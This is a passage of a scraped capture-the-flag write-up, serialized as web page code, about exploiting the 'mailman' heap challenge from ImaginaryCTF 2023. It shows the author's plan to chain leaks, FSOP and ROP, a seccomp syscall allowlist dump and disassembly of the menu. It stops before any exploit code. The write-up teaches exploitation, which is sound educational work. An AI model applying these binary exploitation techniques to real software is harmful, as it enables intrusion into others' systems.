2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://www.linkedin.com/company/project-sekai-ctf/"><span class="sr-only"><span class="w-6">linkedin</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://twitter.com/ProjectSEKAIctf"><span class="sr-only"><span class="w-6">twitter</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M23.953 4.57a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 0 0-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.06a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.936 4.936 0 0 0 4.604 3.417 9.867 9.867 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0 0 24 4.59z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://ctftime.org/team/169557"><span class="sr-only"><span class="w-6">ctftime</span></span><svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M24 0v24H0V0h24Zm-3.077 3.077L7.067 3.076 16 12.816 10.369 19l-2.195-2.612 3.476-3.573-8.574-9.609v17.717h17.847V3.077Z" fill="currentColor" fill-rule="evenodd"></path></svg></a></div></div><div class="flex mb-2 space-x-2 text-sm text-gray-500 dark:text-gray-400"><a href="/">Project SEKAI</a><div> • </div><div>© 2024</div><div> • </div><div><a href="https://1a23.com">1A23 Studio</a></div></div><div class="mb-8 text-xs text-center text-gray-200 dark:text-gray-700">This website is in no way affiliated with any of the following individuals or organizations.<!-- --> <a target="_blank" rel="noopener noreferrer" href="https://github.com/timlrx/tailwind-nextjs-starter-blog">Tailwind Nextjs Theme</a> © Timothy Lim and contributors; <a target="_blank" rel="noopener noreferrer" href="https://pjsekai.sega.jp/">Project SEKAI: Colorful Stage! feat. Hatsune Miku</a> © SEGA / © Craft Egg Inc. Developed by Colorful Palette; <a target="_blank" rel="noopener noreferrer" href="https://ec.crypton.co.jp/pages/prod/virtualsinger">Character Vocal Series</a> © Crypton Future Media, INC. <a target="_blank" rel="noopener noreferrer" href="https://www.piapro.net">www.piapro.net</a> All rights reserved.</div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"mdxSource":"var Component=(()=\u003e{var r=Object.create;var l=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var d=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var t=a=\u003el(a,\"__esModule\",{value:!0});var u=(a,s)=\u003e()=\u003e(s||a((s={exports:{}}).exports,s),s.exports),N=(a,s)=\u003e{t(a);for(var c in s)l(a,c,{get:s[c],enumerable:!0})},k=(a,s,c)=\u003e{if(s\u0026\u0026typeof s==\"object\"||typeof s==\"function\")for(let e of d(s))!m.call(a,e)\u0026\u0026e!==\"default\"\u0026\u0026l(a,e,{get:()=\u003es[e],enumerable:!(c=p(s,e))||c.enumerable});return a},f=a=\u003ek(t(l(a!=null?r(h(a)):{},\"default\",a\u0026\u0026a.__esModule\u0026\u0026\"default\"in a?{get:()=\u003ea.default,enumerable:!0}:{value:a,enumerable:!0})),a);var i=u((x,o)=\u003e{o.exports=_jsx_runtime});var w={};N(w,{default:()=\u003eg,frontmatter:()=\u003eb});var n=f(i()),b={title:\"ImaginaryCTF 2023 \\u2013 mailman\",date:\"2023-07-24\",draft:!1,authors:[\"surg\"],tags:[\"Imaginary CTF 2023\",\"Assembly\",\"x86_64\",\"Reverse Engineering\",\"Binary Exploitation\",\"Pwn\"],summary:\"Because *every* protection had to be on.\",canonical:\"https://surg.dev/ictf23/\"};function _(a={}){let{wrapper:s}=a.components||{};return s?(0,n.jsx)(s,Object.assign({},a,{children:(0,n.jsx)(c,{})})):c();function c(){let e=Object.assign({h1:\"h1\",a:\"a\",span:\"span\",blockquote:\"blockquote\",p:\"p\",code:\"code\",h2:\"h2\",ol:\"ol\",li:\"li\",pre:\"pre\",ul:\"ul\",em:\"em\"},a.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)(e.h1,{id:\"mailman-423pts-31-solves\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#mailman-423pts-31-solves\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"mailman (423pts, 31 solves)\"]}),`\n`,(0,n.jsxs)(e.blockquote,{children:[`\n`,(0,n.jsx)(e.p,{children:\"I\\u2019m sure that my post office is 100% secure! It uses some of the latest software, unlike some of the other post offices out there...\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Flag is in \",(0,n.jsx)(e.code,{children:\"./flag.txt\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Attachments: \",(0,n.jsx)(e.a,{href:\"https://imaginaryctf.org/r/PIxtO#vuln\",children:\"https://imaginaryctf.org/r/PIxtO#vuln\"}),\" \",(0,n.jsx)(e.a,{href:\"https://imaginaryctf.org/r/c9Mk8#libc.so.6\",children:\"https://imaginaryctf.org/r/c9Mk8#libc.so.6\"})]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"imaginaryCTF ran this past weekend. I competed with \",(0,n.jsx)(e.a,{href:\"https://sekai.team/\",children:\"Project Sekai\"}),\", where we placed third. I helped solve \",(0,n.jsx)(e.code,{children:\"ret2lose\"}),\", \",(0,n.jsx)(e.code,{children:\"mailman\"}),\", \",(0,n.jsx)(e.code,{children:\"lcode\"}),\", and \",(0,n.jsx)(e.code,{children:\"vmdungeon\"}),\". I wanted to mainly focus on \",(0,n.jsx)(e.code,{children:\"mailman\"}),\" as that challenge I worked on the most and ended up with the full exploit chain.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"I\\u2019m also going to go through this entire exploit with a detailed explanation, as I find heap pwn to be constantly confusing, and there\\u2019s more and more techniques being used and employed in CTFs, so I hope that this explains why I used the tools and methods I did.\"}),`\n`,(0,n.jsxs)(e.h2,{id:\"table-of-contents\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#table-of-contents\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Table of Contents\"]}),`\n`,(0,n.jsxs)(e.ol,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"#secrets\",children:\"My mailman has secrets\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"#leaky\",children:\"Leaky Program\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"#botcake\",children:\"One More Leak, now with cakes!\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"#fsop\",children:\"ROP? I Like FSOP.\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"#rop\",children:\"FSOP? I Like ROP.\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"#tldr\",children:\"TLDR\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"#script\",children:\"Full Script (Annotated)\"})}),`\n`]}),`\n`,(0,n.jsxs)(e.h2,{id:\"my-mailman-has-secrets-\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#my-mailman-has-secrets-\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"My mailman has secrets \",(0,n.jsx)(\"a\",{name:\"secrets\"})]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Mailman was a standard heapnote type challenge (I\\u2019ve seen it referred to as \",(0,n.jsx)(e.code,{children:\"CRUD\"}),\": \",(0,n.jsx)(e.code,{children:\"Create Read Update DELETE\"}),\"). Loading into the program, we\\u2019re given options to write, read, or send a letter:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`Welcome to the post office.\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`Enter your choice below:\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`1. Write a letter\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`2. Send a letter\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`3. Read a letter\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\u003e\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Picking 1 allows us to specify an index, letter size (in bytes), and then send data, terminating on a new line. Picking 2 lets us pick an index, but seemingly does nothing, and picking 3 outputs the text of the letter that we select.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"We aren\\u2019t given source, so we have to look at it in a disassembler. The first thing Binary Ninja shows us in the \",(0,n.jsx)(e.code,{children:\"main\"}),\" function is \",(0,n.jsx)(e.code,{children:\"seccomp\"}),\":\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001365\"}),\"      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"seccomp_rule_add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fff0000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001385\"}),\"      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"seccomp_rule_add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fff0000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000013\"}),\"a5      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"seccomp_rule_add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fff0000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000013\"}),\"c5      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"seccomp_rule_add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fff0000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000013e5\"}),\"      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"seccomp_rule_add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fff0000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x3c\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000013f\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\"      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"seccomp_load\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:['seccomp is a way to make a type of \"jail\" for linux programs. It restricts execution to a limited set of syscalls, and kills the program if it attempts to call banned ones. While one could probably parse out that this is setting up an allowlist of syscalls ',(0,n.jsx)(e.code,{children:\"0\"}),\", \",(0,n.jsx)(e.code,{children:\"1\"}),\", \",(0,n.jsx)(e.code,{children:\"2\"}),\", \",(0,n.jsx)(e.code,{children:\"5\"}),\", and \",(0,n.jsx)(e.code,{children:\"0x3c\"}),\", I don\\u2019t know seccomp by heart. Luckily, \",(0,n.jsx)(e.code,{children:\"seccomp-tools\"}),\" can tell us exactly what is going on here:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-bash\",children:(0,n.jsxs)(e.code,{className:\"language-bash code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`srg@pop-os:~/CTF/ictf23/mailman$ seccomp-tools dump ./vuln\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:` line  CODE  JT   JF      K\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0000: 0x20 0x00 0x00 0x00000004  A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` arch\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0001: 0x15 0x00 0x09 0xc000003e  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"!=\"}),\" ARCH_X86_64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0011\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0002: 0x20 0x00 0x00 0x00000000  A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` sys_number\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0003: 0x35 0x00 0x01 0x40000000  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003c\"}),\" 0x40000000\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0005\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0004: 0x15 0x00 0x06 0xffffffff  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"!=\"}),\" 0xffffffff\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0011\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0005: 0x15 0x04 0x00 0x00000000  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin class-name\",children:\"read\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0010\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0006: 0x15 0x03 0x00 0x00000001  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"write\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0010\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0007: 0x15 0x02 0x00 0x00000002  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"open\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0010\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0008: 0x15 0x01 0x00 0x00000005  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" fstat\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0010\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0009: 0x15 0x00 0x01 0x0000003c  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"!=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin class-name\",children:\"exit\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0011\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0010: 0x06 0x00 0x00 0x7fff0000  \",(0,n.jsx)(e.span,{className:\"token builtin class-name\",children:\"return\"}),` ALLOW\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0011: 0x06 0x00 0x00 0x00000000  \",(0,n.jsx)(e.span,{className:\"token builtin class-name\",children:\"return\"}),` KILL\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"As expected, this only allows 64-bit syscalls \",(0,n.jsx)(e.code,{children:\"(A \u003c 0x4000000)\"}),\", and of those, only permits \",(0,n.jsx)(e.code,{children:\"read, write, open, fstat, exit\"}),\". This means that when we do get some form of code execution, we have to open, read, and print the flag, rather than popping a shell with \",(0,n.jsx)(e.code,{children:\"execve\"}),\". Let\\u2019s look at the rest of the menu:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001478\"}),\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"while\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"true\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001478\"}),\"          \",(0,n.jsx)(e.span,{className:\"token function\",children:\"printf\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"format\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"\u003e \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001493\"}),\"          \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"int32_t\"}),` var_2c\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001493\"}),\"          \",(0,n.jsx)(e.span,{className:\"token function\",children:\"__isoc99_scanf\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"format\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"%d%*c\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\"}),\"var_2c\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001498\"}),\"          \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"int32_t\"}),\" rax_16 \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` var_2c\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0000149\"}),\"e          \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_16 \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000015\"}),\"bc              \",(0,n.jsx)(e.span,{className:\"token function\",children:\"puts\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"str\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" mem\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"inidx\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"a7          \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"a7              \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_16 s\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"a7                  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"break\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"b0              \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_16 \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"c5                  \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"int64_t\"}),\" rax_18 \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"inidx\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"dd                  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"printf\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"format\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"letter size: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014f\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),\"                  \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"uint64_t\"}),` bytes\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014f\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),\"                  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"__isoc99_scanf\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"format\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"%lu%*c\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token 